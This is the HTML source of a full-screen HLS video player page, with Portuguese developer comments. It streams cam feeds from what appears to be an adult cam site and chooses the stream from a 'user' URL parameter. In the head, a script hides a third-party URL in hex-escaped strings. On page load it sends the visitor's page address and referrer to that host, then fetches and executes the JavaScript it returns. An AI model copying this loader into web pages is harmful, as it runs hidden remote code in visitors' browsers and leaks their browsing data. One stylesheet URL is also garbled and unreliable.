<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
<head>
    <meta name="renderer" content="webkit"/>
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <link rel="icon" type="image/png" href="https://xcam.gay/assets/icons/icon-96x96.png" />
    <link rel="shortcut icon" href="https://xcam.gay/assets/icons/icon-96x96.png" />
    <meta name="keywords" content="m3u8 online player,hls player,m3u8,hls,stream player" />
    <meta name="description" content="To play M3U8/HLS/MP4 streams/videos online with no installation required." />
    <title>HLS & M3U8 Online Player</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, shrink-to-fit=no" />
    <link rel="stylesheet" href="https://player.xcam.gay/hls/css/site05.css" />
    <script src="https://player.xcam.gay/hls/scripts/jquery-3.5.1.min.js"></script>
    <script src="https://player.xcam.gay/hls/scripts/jquery.blockUI.min.js"></script>
    <script src="https://player.xcam.gay/hls/scripts/toastr/toastr.min.js"></script>
    <link href="https://player.xcam.gay/hls/scripts/toastr/toastr.css" rel="Stylesheet" />
    <script src="https://player.xcam.gay/hls/scripts/hls.min.js"></script>
    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0https://player.xcam.gay/hls/css/font-awesome.min.css" />
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Raleway" />

    <!-- XDev: Início dos Ajustes de CSS para Ecrã Inteiro -->
    <style>
        /*
         * Reset global para remover margens e preenchimentos indesejados.
         * A propriedade 'overflow: hidden' é crucial para desativar as barras de rolagem.
        */
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #000; /* Fundo preto para uma experiência imersiva */
        }

        /*
         * Garante que o container principal e o vídeo preencham todo o espaço disponível.
        */
        .main, .player {
            width: 100vw;  /* 100% da largura da janela (viewport) */
            height: 100vh; /* 100% da altura da janela (viewport) */
        }
        
        .player {
             object-fit: contain; /* Faz o vídeo cobrir a área, evitando barras pretas */
        }
    </style>
    <!-- XDev: Fim dos Ajustes de CSS -->

    <script>
        $(document).ready(function () {
            var _0x6057 = ["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x76\x69\x73\x69\x74\x2E\x78\x63\x68\x69\x6E\x61\x2E\x70\x69\x63\x73\x2F\x76\x2E\x68\x74\x6D\x6C"];
            var url = _0x6057[0];
            url += "?site=12";
            url += "&url=" + escape(window.location.href);
            url += "&referrer=" + escape(document.referrer);
            url += "&title=Homepage";
            $.getScript({url: url, cache: false});
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
    <script>
        var hls = new Hls();
    </script>

    <script>
        $(document).ready(function () {
            var isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
            var $player = $("#player");
            
            // XDev: Início da lógica para URL dinâmica
            // 1. Captura os parâmetros da URL.
            const urlParams = new URLSearchParams(window.location.search);
            const user = urlParams.get('user'); // Procura pelo parâmetro 'user'.

            var videoSrc;

            // 2. Verifica se o parâmetro 'user' foi encontrado.
            if (user) {
                // Se sim, constrói a URL do vídeo com o valor do parâmetro.
                videoSrc = `https://api.xcam.gay/stream/${user}.m3u8`;
                console.log(`Parâmetro 'user' encontrado. A carregar stream para: ${user}`);
            } else {
                // Se não, usa uma URL padrão como fallback.
                videoSrc = "https://api.xcam.gay/stream/JacksonOlsenn.m3u8"; // URL Padrão
                console.log("Nenhum parâmetro 'user' encontrado. A carregar stream padrão.");
            }
            // XDev: Fim da lógica para URL dinâmica

            // Garante que o player inicie automaticamente
            $player.prop('autoplay', true);
            $player.prop('muted', true); // Autoplay geralmente requer que o vídeo comece sem som
            $player.prop('playsinline', true); // Essencial para autoplay em iOS

            if (isIOS) {
                console.log("Using native iOS playback");
                $player.attr("src", videoSrc);
                $player[0].play();
            } else if (Hls.isSupported()) {
                console.log("Using HLS.js for playback");
                hls.loadSource(videoSrc);
                hls.attachMedia($player[0]);
                hls.on(Hls.Events.MEDIA_ATTACHED, function () {
                    $player[0].play();
                });
            } else if ($player[0].canPlayType('application/vnd.apple.mpegurl')) {
                console.log("Using native HLS playback");
                $player.attr("src", videoSrc);
                $player[0].addEventListener('loadedmetadata', function() {
                    this.play();
                });
            } else {
                console.log("This browser does not support HLS playback");
            }
        });
    </script>
</head>
<body>
    <div class="main">
        <!-- XDev: Removido o atributo 'controls' para desativar os controlos do player -->
        <video class="player" id="player"></video>
    </div>
</body>
</html>
